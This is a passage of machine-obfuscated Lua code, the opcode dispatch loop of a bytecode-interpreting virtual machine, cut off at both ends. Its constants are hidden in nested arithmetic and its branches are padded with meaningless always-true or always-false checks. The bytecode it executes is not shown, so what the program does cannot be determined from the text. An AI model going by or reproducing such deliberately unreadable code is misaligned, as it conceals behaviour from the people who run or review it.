;v78=v66[v70];v76[v78[3 -1 ]][v78[6 -3 ]]=v76[v78[1 + 3 ]];v70=v70 + (1691 -(1121 + 569)) ;v78=v66[v70];v76[v78[216 -(22 + 192) ]]=v76[v78[3]];v70=v70 + (684 -(483 + 200)) ;v78=v66[v70];v76[v78[1465 -(1404 + 59) ]]=v78[8 -5 ];v70=v70 + ((1020 -(829 + 190)) -0) ;v78=v66[v70];v76[v78[767 -(468 + 297) ]]=v78[565 -(334 + 228) ];v70=v70 + (3 -(7 -5)) ;v78=v66[v70];v128=v78[4 -2 ];v76[v128]=v76[v128](v13(v76,v128 + 1 ,v78[5 -2 ]));v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[1 + 1 ]][v78[239 -(141 + 95) ]]=v76[v78[4 + 0 ]];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[2]]=v76[v78[3]];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[1 + (1 -0) ]]=v78[8 -5 ];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[4 -1 ];v70=v70 + (2 -1) + 0 ;v78=v66[v70];v128=v78[2];v76[v128]=v76[v128](v13(v76,v128 + (164 -(92 + 17 + 54)) ,v78[3]));v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[(1 + 1) -0 ]][v78[3]]=v76[v78[769 -(574 + 191) ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[4 -2 ]]=v76[v78[2 + 1 ]];v70=v70 + ((2580 -1730) -(254 + 595)) ;v78=v66[v70];v76[v78[(121 + 7) -(55 + 71) ]]=v78[3];v70=v70 + (1 -(613 -(520 + 93))) ;v78=v66[v70];v76[v78[1792 -(573 + (1493 -(259 + 17))) ]]=v78[8 -(1 + 4) ];v70=v70 + 1 + 0 ;v78=v66[v70];v128=v78[2 -(0 + 0) ];v76[v128]=v76[v128](v13(v76,v128 + 1 ,v78[942 -(714 + 225) ]));v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[2]][v78[3 -0 ]]=v76[v78[4]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 -0 ]]=v76[v78[809 -(118 + 688) ]];v70=v70 + (49 -(25 + (77 -54))) ;v78=v66[v70];v76[v78[1 + 1 ]]=v78[1889 -(927 + 959) ];v70=v70 + 1 ;v78=v66[v70];v76[v78[(597 -(396 + 195)) -4 ]]=v78[735 -(16 + 716) ];v70=v70 + (1 -0) ;v78=v66[v70];v128=v78[99 -(11 + (249 -163)) ];v76[v128]=v76[v128](v13(v76,v128 + 1 ,v78[6 -(1764 -(440 + 1321)) ]));v70=v70 + (286 -((2004 -(1059 + 770)) + 110)) ;v78=v66[v70];v76[v78[4 -2 ]][v78[3]]=v76[v78[19 -15 ]];v70=v70 + (1797 -(503 + 1293)) ;v78=v66[v70];v76[v78[2]]=v76[v78[(36 -28) -5 ]];v70=v70 + (546 -(424 + 121)) + 0 ;v78=v66[v70];v76[v78[1063 -(810 + 251) ]]=v78[3 + 0 ];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[536 -(43 + 90 + 400) ];v70=v70 + 1 ;v78=v66[v70];v128=v78[2];v76[v128]=v76[v128](v13(v76,v128 + (734 -(711 + (1369 -(641 + 706)))) ,v78[11 -8 ]));v70=v70 + (860 -(240 + 619)) ;v78=v66[v70];v76[v78[1 + 0 + 1 ]][v78[3]]=v76[v78[5 -1 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1746 -((1784 -(249 + 191)) + 400) ]]=v76[v78[3]];v70=v70 + (406 -(255 + 150)) ;v78=v66[v70];v76[v78[2 + (0 -0) ]]=v78[3];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[3];v70=v70 + (4 -3) ;v78=v66[v70];v128=v78[2];v76[v128]=v76[v128](v13(v76,v128 + (3 -2) ,v78[3]));v70=v70 + (1740 -(404 + 1335)) ;v78=v66[v70];v76[v78[(1572 -1164) -(183 + 223) ]][v78[3 -0 ]]=v76[v78[3 + 1 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[339 -(10 + (754 -(183 + 244))) ]]=v76[v78[3 + 0 + 0 ]];v70=v70 + (339 -(118 + 220)) ;v78=v66[v70];v76[v78[(731 -(434 + 296)) + (2 -1) ]]=v78[452 -(108 + 341) ];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[8 -6 ]]=v78[1496 -(711 + 782) ];v70=v70 + (1 -(512 -(169 + 343))) ;v78=v66[v70];v128=v78[471 -(270 + 175 + 24) ];v76[v128]=v76[v128](v13(v76,v128 + (1 -0) + 0 ,v78[(5347 -3525) -(580 + 1239) ]));v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[2 + 0 ]][v78[1 + 2 ]]=v76[v78[2 + 2 + 0 ]];end elseif ((v79<=(15 -9)) or (4962==3146)) then local v235=0 + 0 ;local v236;while true do if (v235==((3312 -2144) -((1768 -(651 + 472)) + 522))) then v78=v66[v70];v76[v78[(1355 + 437) -(1010 + 337 + 443) ]]=v60[v78[(3 -0) + 0 ]];v70=v70 + (4 -3) ;v235=5 -3 ;end if ((v235==(1840 -(1045 + 791))) or (475>4146)) then v78=v66[v70];v236=v78[4 -2 ];v76[v236](v76[v236 + 1 ]);v235=7 -2 ;end if ((v235==(507 -(351 + 154))) or (121>=129)) then v78=v66[v70];v76[v78[1576 -(1281 + 293) ]]=v76[v78[3]][v78[270 -(28 + 238) ]];v70=v70 + (2 -(484 -(397 + 86))) ;v235=3;end if (v235==0) then v236=nil;v59[v78[(2438 -(423 + 453)) -(1381 + 178) ]]=v76[v78[2 + 0 ]];v70=v70 + 1 ;v235=1 + 0 ;end if (v235==(3 + 2)) then v70=v70 + 1 ;v78=v66[v70];if v76[v78[6 -4 ]] then v70=v70 + 1 + 0 ;else v70=v78[473 -(381 + 89) ];end break;end if (v235==(3 + 0)) then v78=v66[v70];v76[v78[2]]=v76[v78[1 + 2 + 0 ]];v70=v70 + (1 -0) ;v235=1160 -(1074 + 82) ;end end elseif (v79>7) then local v518=0 -0 ;local v519;local v520;while true do if ((v518==3) or (2058>4958)) then v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1786 -(187 + 27 + 1570) ]]=v59[v78[3]];v518=4;end if ((1759==1759) and ((1456 -(990 + 465))==v518)) then v70=v70 + 1 + 0 ;v78=v66[v70];v520=v78[1 + 1 ];v518=2 + 0 ;end if (v518==((0 + 0) -(0 + 0))) then v519=nil;v520=nil;v76[v78[1728 -(1668 + 58) ]]=v76[v78[629 -(512 + 114) ]][v78[10 -6 ]];v518=1 -0 ;end if ((1192 -(50 + 1140))==v518) then v519=v76[v78[10 -(7 + 0) ]];v76[v520 + 1 + 0 ]=v519;v76[v520]=v519[v78[4]];v518=3;end if ((5==v518) or (4543==358)) then v76[v520](v13(v76,v520 + 1 + 0 + 0 ,v78[1 + 2 + 0 ]));v70=v70 + (3 -2) ;v78=v66[v70];v518=2000 -(109 + 1885) ;end if (v518==((2114 -641) -(1269 + 200))) then v70=v70 + (1 -0) ;v78=v66[v70];v520=v78[817 -(98 + 717) ];v518=(602 + 229) -(802 + 24) ;end if (v518==6) then v70=v78[3];break;end end else v76[v78[2 -(596 -(157 + 439)) ]]();end elseif ((2003==2003) and (v79<=13)) then if (v79<=(12 -2)) then if ((v79>9) or (3==2368)) then v76[v78[2]][v78[3]]=v76[v78[1 + 3 ]];else local v239=0 + 0 ;local v240;local v241;local v242;while true do if (v239==(0 + 0)) then v240=v78[(1 -0) + 1 ];v241=v76[v240];v239=2 -1 ;end if (v239==(3 -2)) then v242=v78[2 + 1 ];for v836=1 + 0 ,v242 do v241[v836]=v76[v240 + v836 ];end break;end end end elseif ((v79<=(10 + 1)) or (2757>3968)) then for v486=v78[(6 -4) + 0 ],v78[(5 -3) + 1 ] do v76[v486]=nil;end elseif (v79>((2363 -(782 + 136)) -(797 + 636))) then v76[v78[9 -7 ]]=v60[v78[3]];else local v523=v78[(2476 -(112 + 743)) -(1427 + (1363 -(1026 + 145))) ];v76[v523](v76[v523 + 1 + 0 ]);end elseif (v79<=((6 + 28) -19)) then if (v79>(13 + 1)) then local v243=v78[1 + 1 ];do return v13(v76,v243,v71);end elseif ((812<=1870) and  not v76[v78[2]]) then v70=v70 + (327 -(192 + 134)) ;else v70=v78[(1997 -(493 + 225)) -(316 + (3528 -2568)) ];end elseif (v79<=(9 + 7)) then local v244=0 + 0 ;local v245;local v246;local v247;local v248;while true do if ((2 + 0)==v244) then for v839=v245,v71 do v248=v248 + (3 -2) ;v76[v839]=v246[v248];end break;end if ((551 -(51 + 32 + 468))==v244) then v245=v78[2];v246,v247=v69(v76[v245](v13(v76,v245 + (1807 -(1202 + 604)) ,v71)));v244=4 -(7 -4) ;end if ((3889==3889) and (v244==(1 -0))) then v71=(v247 + v245) -(1 + 0) ;v248=0;v244=2;end end elseif (v79==(46 -(82 -53))) then local v525;local v526;v76[v78[327 -(45 + 280) ]]=v59[v78[3 + 0 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[3]][v78[2 + 2 ]];v70=v70 + 1 + (0 -0) ;v78=v66[v70];v526=v78[(1596 -(210 + 1385)) + 1 ];v525=v76[v78[5 -(1691 -(1201 + 488)) ]];v76[v526 + (1912 -(340 + 1571)) ]=v525;v76[v526]=v525[v78[2 + 2 ]];v70=v70 + (1773 -(1733 + 25 + 14)) ;v78=v66[v70];v76[v78[(8 -3) -3 ]]=v59[v78[(1859 -822) -(125 + 909) ]];v70=v70 + (1949 -(1096 + 852)) ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[3 -0 ]][v78[4 + 0 ]];v70=v70 + (513 -(409 + 103)) ;v78=v66[v70];v526=v78[238 -(46 + 190) ];v76[v526]=v76[v526](v13(v76,v526 + (96 -(51 + 44)) ,v78[1 + 2 ]));v70=v70 + (1318 -(1114 + 203)) ;v78=v66[v70];if v76[v78[728 -(228 + 498) ]] then v70=v70 + 1 + (585 -(352 + 233)) ;else v70=v78[2 + 1 ];end else local v541=v78[665 -((420 -246) + 489) ];local v542,v543=v69(v76[v541](v13(v76,v541 + ((2 + 0) -1) ,v78[1908 -(830 + 1075) ])));v71=(v543 + v541) -(525 -(303 + (628 -407))) ;local v544=(1843 -(489 + 85)) -((1732 -(277 + 1224)) + 1038) ;for v714=v541,v71 do v544=v544 + 1 ;v76[v714]=v542[v544];end end elseif (v79<=(24 + 4)) then if ((1411<2388) and (v79<=(1185 -(171 + 991)))) then if (v79<=20) then if (v79==(78 -59)) then v76[v78[2]]=v59[v78[7 -(1497 -(663 + 830)) ]];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[10 -7 ]][v78[11 -7 ]];v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[6 -4 ]][v76[v78[1251 -(98 + 13 + 1137) ]]]=v78[162 -(91 + 67) ];v70=v70 + ((4 -2) -1) ;v78=v66[v70];v76[v78[877 -(461 + 414) ]]=v59[v78[1 + 2 ]];v70=v70 + (524 -(423 + 17 + 83)) ;v78=v66[v70];v76[v78[2]]=v76[v78[1 + 2 ]][v78[10 -6 ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]][v76[v78[2 + 1 + 0 ]]]=v78[775 -(326 + 445) ];v70=v70 + (4 -3) ;v78=v66[v70];v76[v78[4 -(1 + 1) ]]=v76[v78[6 -3 ]];v70=v70 + (712 -(530 + 181)) ;v78=v66[v70];for v488=v78[2],v78[884 -(614 + 267) ] do v76[v488]=nil;end v70=v70 + (33 -(19 + 13 + 0)) ;v78=v66[v70];v76[v78[2 -0 ]]=v78[6 -3 ];v70=v70 + (2 -1) ;v78=v66[v70];v70=v78[1 + 2 ];else local v266=0;local v267;local v268;local v269;while true do if ((4771==4771) and (v266==(251 -(172 + 78)))) then v269={};v268=v10({},{__index=function(v843,v844) local v845=0 -0 ;local v846;while true do if ((v845==(0 -0)) or (98>=2345)) then v846=v269[v844];return v846[1813 -(1293 + 519) ][v846[3 -1 ]];end end end,__newindex=function(v847,v848,v849) local v850=0 -0 ;local v851;while true do if ((4297>1243) and (v850==(0 -0))) then v851=v269[v848];v851[1][v851[8 -6 ]]=v849;break;end end end});v266=4 -2 ;end if (v266==(2 + 0)) then for v852=1 + 0 ,v78[4] do local v853=0 -0 ;local v854;while true do if (v853==(1 + (0 -0))) then if (v854[1 + 0 ]==(7 + 18 + 5 + 9)) then v269[v852-((1837 -740) -(709 + 387)) ]={v76,v854[9 -6 ]};else v269[v852-1 ]={v59,v854[3 + 0 ]};end v75[ #v75 + (1 -(0 + 0)) ]=v269;break;end if (v853==(0 + 0)) then v70=v70 + 1 ;v854=v66[v70];v853=1 -0 ;end end end v76[v78[3 -1 ]]=v29(v267,v268,v60);break;end if (v266==(1880 -(446 + 1434))) then v267=v67[v78[3]];v268=nil;v266=1284 -(1040 + 243) ;end end end elseif (v79<=(62 -41)) then local v270=v78[1849 -(559 + 1288) ];local v271={v76[v270](v13(v76,v270 + (1932 -(609 + 1322)) ,v71))};local v272=454 -(13 + 441) ;for v490=v270,v78[14 -10 ] do v272=v272 + (2 -1) ;v76[v490]=v271[v272];end elseif (v79>(109 -87)) then local v545;local v546,v547;local v548;local v549;v76[v78[1 + 1 ]]=v59[v78[(4 + 6) -7 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1 + (3 -2) ]][v76[v78[3]]]=v76[v78[4]];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[2 + 0 ]]=v59[v78[4 -1 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 + 0 ]]=v59[v78[3 + (0 -0) ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[(134 + 302) -(153 + 280) ]][v78[3 + 1 ]];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[2 + 1 ];v70=v70 + 1 + (447 -(133 + 314)) ;v78=v66[v70];v549=v78[2 + 0 ];v548=v76[v78[3 + 0 ]];v76[v549 + (1 -0) ]=v548;v76[v549]=v548[v78[4]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[669 -(89 + 578) ]]=v59[v78[3 + 0 ]];v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[2]]=v76[v78[1052 -(572 + 477) ]][v78[4]];v70=v70 + 1 + 0 ;v78=v66[v70];v549=v78[2 + 0 ];v546,v547=v69(v76[v549](v13(v76,v549 + 1 ,v78[3])));v71=(v547 + v549) -(1 + 0) ;v545=86 -(84 + 2) ;for v719=v549,v71 do v545=v545 + (1 -0) ;v76[v719]=v546[v545];end v70=v70 + 1 + 0 ;v78=v66[v70];v549=v78[844 -(497 + 345) ];v76[v549](v13(v76,v549 + 1 + 0 + 0 ,v71));v70=v70 + 1 + (213 -(199 + 14)) ;v78=v66[v70];v76[v78[1335 -(605 + 728) ]]=v78[3 + 0 ];else local v572=0;local v573;while true do if (v572==(0 -0)) then v573=v78[1 + 1 ];v76[v573](v13(v76,v573 + (3 -2) ,v71));break;end end end elseif (v79<=(23 + 2)) then if ((167<=4460) and (v79>(66 -42))) then local v273;local v274,v275;local v276;v76[v78[2 + 0 ]]=v76[v78[492 -(457 + 32) ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[1 + 1 ]]=v59[v78[1405 -(832 + (2040 -1470)) ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1 + 1 ]]=v59[v78[10 -7 ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v59[v78[1552 -(647 + 902) ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2]]=v59[v78[799 -(588 + 208) ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[5 -3 ]]=v76[v78[1803 -(884 + 916) ]];v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[3]];v70=v70 + (654 -(232 + 421)) ;v78=v66[v70];v76[v78[(5686 -3795) -(1569 + 320) ]]=v76[v78[3]] + v78[1 + 3 ] ;v70=v70 + 1 + 0 ;v78=v66[v70];v276=v78[6 -4 ];v274,v275=v69(v76[v276](v13(v76,v276 + (606 -(316 + (522 -(85 + 148)))) ,v78[7 -4 ])));v71=(v275 + v276) -(1 + 0) ;v273=0;for v493=v276,v71 do local v494=1453 -(666 + 787) ;while true do if ((v494==(425 -(360 + 65))) or (3812<3081)) then v273=v273 + 1 + 0 ;v76[v493]=v274[v273];break;end end end v70=v70 + (255 -(79 + 175)) ;v78=v66[v70];v276=v78[2 -0 ];v76[v276]=v76[v276](v13(v76,v276 + 1 + 0 ,v71));v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[3 -(1290 -(426 + 863)) ]]=v59[v78[902 -(503 + 396) ]];v70=v70 + (182 -(92 + 89)) ;v78=v66[v70];v76[v78[(13 -10) -1 ]]=v59[v78[2 + 1 ]];v70=v70 + (1655 -(873 + 781)) ;v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[11 -8 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[(4 -0) -2 ]]= #v76[v78[3 + 0 ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[1 + (2 -1) ]]=v76[v78[8 -5 ]]%v76[v78[1 + 3 ]] ;v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[1246 -(485 + 759) ]]=v78[6 -3 ] + v76[v78[1193 -(442 + 747) ]] ;v70=v70 + (1136 -(832 + 303)) ;v78=v66[v70];v76[v78[948 -(88 + 858) ]]= #v76[v78[1 + 2 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[3]]%v76[v78[793 -(766 + 23) ]] ;v70=v70 + (4 -3) ;v78=v66[v70];v76[v78[2 -0 ]]=v78[7 -4 ] + v76[v78[13 -9 ]] ;v70=v70 + (1074 -(1036 + 37)) ;v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[5 -2 ]] + v78[4 + 0 + 0 ] ;v70=v70 + ((5471 -3990) -(641 + 839)) ;v78=v66[v70];v276=v78[915 -(910 + 3) ];v274,v275=v69(v76[v276](v13(v76,v276 + (2 -1) ,v78[1687 -(1466 + 218) ])));v71=(v275 + v276) -(1 + 0) ;v273=1148 -((796 -240) + 592) ;for v495=v276,v71 do v273=v273 + 1 + 0 ;v76[v495]=v274[v273];end v70=v70 + (809 -(329 + 479)) ;v78=v66[v70];v276=v78[856 -(174 + 680) ];v274,v275=v69(v76[v276](v13(v76,v276 + ((8 -5) -2) ,v71)));v71=(v275 + v276) -(1 -0) ;v273=(1947 -(414 + 1533)) + 0 + 0 ;for v498=v276,v71 do v273=v273 + (740 -(396 + 343)) ;v76[v498]=v274[v273];end v70=v70 + 1 ;v78=v66[v70];v276=v78[1 + 1 ];v76[v276]=v76[v276](v13(v76,v276 + (1478 -(29 + (2003 -(443 + 112)))) ,v71));v70=v70 + (1390 -(135 + 1254)) ;v78=v66[v70];v76[v78[2]]=v76[v78[11 -8 ]]%v78[18 -14 ] ;v70=v70 + 1 ;v78=v66[v70];v276=v78[1481 -(888 + 591) ];v274,v275=v69(v76[v276](v76[v276 + 1 + 0 ]));v71=(v275 + v276) -(1528 -(389 + 1138)) ;v273=574 -(102 + 472) ;for v501=v276,v71 do v273=v273 + 1 + 0 ;v76[v501]=v274[v273];end v70=v70 + 1 ;v78=v66[v70];v276=v78[2 + 0 ];v76[v276](v13(v76,v276 + 1 + 0 ,v71));else local v308;v76[v78[1547 -(320 + 1225) ]]=v59[v78[3]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2 -0 ]]=v76[v78[2 + 1 ]][v78[1468 -(157 + 1307) ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[(4808 -2947) -(821 + 1038) ]]=v59[v78[3]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[4 -2 ]]=v76[v78[1 + 2 ]][v78[(22 -16) -2 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v308=v78[4 -2 ];v76[v308](v13(v76,v308 + ((401 + 626) -(834 + 192)) ,v78[1 + 2 ]));v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1 + 1 ]]=v78[4 -1 ];v70=v70 + (305 -(300 + 4)) ;v78=v66[v70];v70=v78[1 + 1 + 1 ];end elseif (v79<=26) then local v321=v78[(1 + 6) -4 ];local v322=v76[v321];for v504=v321 + ((691 -328) -(112 + 250)) ,v78[2 + (3 -1) ] do v322=v322   .. v76[v504] ;end v76[v78[4 -2 ]]=v322;elseif (v79==(16 + 11)) then local v574=v78[2 + (1678 -(136 + 1542)) ];v76[v574](v13(v76,v574 + 1 + 0 ,v78[2 + 1 ]));else v76[v78[2 + 0 ]]={};end elseif (v79<=(1447 -(1001 + 413))) then if (v79<=((216 -150) -36)) then if (v79>(911 -(244 + 638))) then if (v76[v78[695 -(627 + 66) ]]<v76[v78[11 -7 ]]) then v70=v70 + (603 -(512 + 90)) ;else v70=v78[(1895 + 14) -(1665 + 241) ];end else local v324=v78[719 -(373 + 344) ];v76[v324]=v76[v324]();end elseif (v79<=(14 + 17)) then local v326=0;local v327;while true do if ((v326==0) or (3611>4881)) then v327=v78[1 + 1 ];do return v76[v327](v13(v76,v327 + 1 ,v78[3]));end break;end end elseif (v79>((133 -49) -52)) then local v577=v78[2 -0 ];local v578,v579=v69(v76[v577](v76[v577 + 1 ]));v71=(v579 + v577) -(1100 -(35 + 771 + 293)) ;local v580=0 + 0 ;for v723=v577,v71 do v580=v580 + 1 ;v76[v723]=v578[v580];end else v76[v78[4 -2 ]]=v76[v78[1 + (488 -(68 + 418)) ]][v78[1240 -(298 + 938) ]];end elseif (v79<=35) then if (v79==(1293 -(233 + 1026))) then local v328=v78[1668 -(636 + 1030) ];local v329=v78[3 + 1 ];local v330=v328 + 2 + 0 ;local v331={v76[v328](v76[v328 + 1 ],v76[v330])};for v505=1 + 0 ,v329 do v76[v330 + v505 ]=v331[v505];end local v332=v331[1];if v332 then v76[v330]=v332;v70=v78[(606 -382) -(55 + 166) ];else v70=v70 + 1 + 0 ;end else local v333;v76[v78[1 + 1 ]]=v59[v78[3]];v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[2]]=v76[v78[3]][v78[301 -(36 + 261) ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[3 -1 ]]=v59[v78[1371 -(34 + 1334) ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[3]][v78[1287 -(1035 + 248) ]];v70=v70 + (22 -(20 + 1)) ;v78=v66[v70];v333=v78[2 + 0 ];v76[v333](v13(v76,v333 + (320 -(134 + 185)) ,v78[3]));v70=v70 + (1134 -(549 + 584)) ;v78=v66[v70];v76[v78[(1245 -558) -(314 + 371) ]]={};v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[(838 + 132) -(478 + (1582 -(770 + 322))) ]]=v76[v78[2 + 1 ]];v70=v70 + (1173 -(786 + 386)) ;v78=v66[v70];v76[v78[6 -(1 + 3) ]]={};v70=v70 + (1380 -(1055 + 324)) ;v78=v66[v70];v76[v78[2]]=v76[v78[1343 -(1093 + 247) ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1 + 1 ]]=v78[11 -8 ];end elseif ((2187<3817) and (v79<=(121 -85))) then if ((428<=985) and (v76[v78[5 -3 ]]==v78[9 -5 ])) then v70=v70 + 1 ;else v70=v78[1 + 1 + 1 ];end elseif (v79==(142 -105)) then if v76[v78[6 -4 ]] then v70=v70 + 1 + 0 + (0 -0) ;else v70=v78[7 -4 ];end else v76[v78[690 -(364 + 324) ]]=v76[v78[7 -4 ]] + v78[9 -5 ] ;end elseif (v79<=(20 + 38)) then if (v79<=(200 -152)) then if (v79<=(68 -25)) then if (v79<=(121 -(156 -75))) then if (v79>(1307 -(1249 + 19))) then v76[v78[(5 -3) + 0 ]]=v78[11 -(29 -21) ]~=(1086 -(686 + 400)) ;else v76[v78[2 + 0 ]]=v76[v78[232 -(41 + 32 + (233 -77)) ]];end elseif (v79<=(1 + 40)) then local v353=v78[813 -(721 + 44 + 46) ];v76[v353]=v76[v353](v76[v353 + 1 + 0 + 0 ]);elseif (v79==42) then local v587=v78[6 -4 ];v76[v587]=v76[v587](v13(v76,v587 + (471 -(176 + 48 + 246)) ,v78[4 -1 ]));else local v589=0;local v590;local v591;while true do if ((2952>=1023) and (v589==(82 -60))) then v70=v70 + ((1 -0) -0) ;v78=v66[v70];v76[v78[1 + 1 ]]=v78[1 + 2 ];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[3 -1 ]]=v78[9 -6 ];v70=v70 + 1 ;v78=v66[v70];v589=536 -(203 + 105 + 205) ;end if ((554<=3482) and (v589==(2017 -(1238 + 755)))) then v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1536 -(709 + (3800 -2975)) ]]=v78[4 -(3 -2) ];v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[2]]=v78[867 -(196 + 668) ];v70=v70 + (3 -(1 + 1)) ;v78=v66[v70];v589=51 -26 ;end if (v589==25) then v591=v78[835 -(171 + 662) ];v76[v591]=v76[v591](v13(v76,v591 + 1 ,v78[96 -(4 + 89) ]));v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[2]][v78[2 + 1 ]]=v76[v78[(84 -67) -13 ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[1489 -((866 -(762 + 69)) + 1451) ]];v589=1479 -(28 + 1425) ;end if ((1993 -(941 + 1052))==v589) then v590=nil;v591=nil;v76[v78[(6 -4) + 0 ]]=v78[1517 -(822 + 692) ];v70=v70 + (1 -(0 + 0)) ;v78=v66[v70];v76[v78[2]]=v78[2 + 0 + (2 -1) ];v70=v70 + (298 -(45 + 252)) ;v78=v66[v70];v589=1;end if ((74<=3533) and (v589==(11 + 0))) then v591=v78[2];v76[v591]=v76[v591](v13(v76,v591 + 1 + 0 ,v78[7 -4 ]));v70=v70 + (434 -(114 + 319)) ;v78=v66[v70];v76[v78[2 -(0 + 0) ]][v78[3 -0 ]]=v76[v78[3 + 1 ]];v70=v70 + (1 -(0 + 0)) ;v78=v66[v70];v76[v78[3 -1 ]]=v76[v78[1966 -(556 + 1407) ]];v589=1218 -(741 + 465) ;end if ((1657<3319) and (v589==(475 -(170 + 295)))) then v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[3];v70=v70 + ((7 -5) -1) ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[2 + 1 ];v70=v70 + 1 + 0 ;v78=v66[v70];v589=1241 -(957 + 273) ;end if (v589==(3 + 5)) then v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[7 -5 ]]=v78[7 -4 ];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[9 -7 ]]=v78[(1940 -(8 + 149)) -(389 + 1391) ];v70=v70 + 1 ;v78=v66[v70];v589=9;end if ((4 + 2)==v589) then v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[4 -2 ]]=v78[954 -((2103 -(1199 + 121)) + 168) ];v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[3 -1 ]]=v78[3 + 0 ];v70=v70 + (312 -(309 + 2)) ;v78=v66[v70];v589=21 -14 ;end if ((v589==(1243 -(1090 + 122))) or (1616==1003)) then v76[v591]=v590[v78[2 + 2 ]];v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[2]]=v76[v78[3 + 0 ]][v78[8 -4 ]];v70=v70 + (1119 -(628 + 490)) ;v78=v66[v70];v591=v78[1 + 1 ];v76[v591]=v76[v591](v13(v76,v591 + (2 -1) ,v78[13 -10 ]));v589=806 -(431 + 343) ;end if (v589==(38 -19)) then v591=v78[5 -(2 + 1) ];v76[v591]=v76[v591](v13(v76,v591 + (3 -2) + 0 ,v78[3]));v70=v70 + 1 ;v78=v66[v70];v76[v78[4 -2 ]][v78[1 + 0 + (1809 -(518 + 1289)) ]]=v76[v78[1699 -(556 + 1139) ]];v70=v70 + (16 -(6 + 9)) ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[2 + 1 ]];v589=189 -(28 + 141) ;end if (v589==(7 + (17 -7))) then v591=v78[2];v76[v591]=v76[v591](v13(v76,v591 + 1 ,v78[3 -0 ]));v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2]][v78[1320 -(65 + 421 + 831) ]]=v76[v78[10 -6 ]];v70=v70 + ((3 -0) -2) ;v78=v66[v70];v76[v78[2]]=v76[v78[1 + 2 + 0 ]];v589=18;end if (((481 -(304 + 165)) -8)==v589) then v70=v70 + (1264 -(668 + 595)) ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[1 + 2 ];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[(276 + 16) -(23 + (427 -(54 + 106))) ]]=v78[3];v70=v70 + (1945 -(1129 + 815)) ;v78=v66[v70];v589=392 -((2340 -(1618 + 351)) + 16) ;end if (v589==((1237 + 516) -((2342 -(10 + 1006)) + 424))) then v591=v78[3 -1 ];v76[v591]=v76[v591](v13(v76,v591 + (3 -2) ,v78[121 -(88 + 30) ]));v70=v70 + (772 -(720 + 51)) ;v78=v66[v70];v76[v78[2]][v78[6 -3 ]]=v76[v78[4]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v76[v78[1779 -(421 + 1355) ]];v589=4;end if ((v589==(29 -11)) or (3672<=863)) then v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1085 -(286 + 797) ]]=v78[10 -(2 + 5) ];v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[441 -(397 + 6 + 36) ]]=v78[1 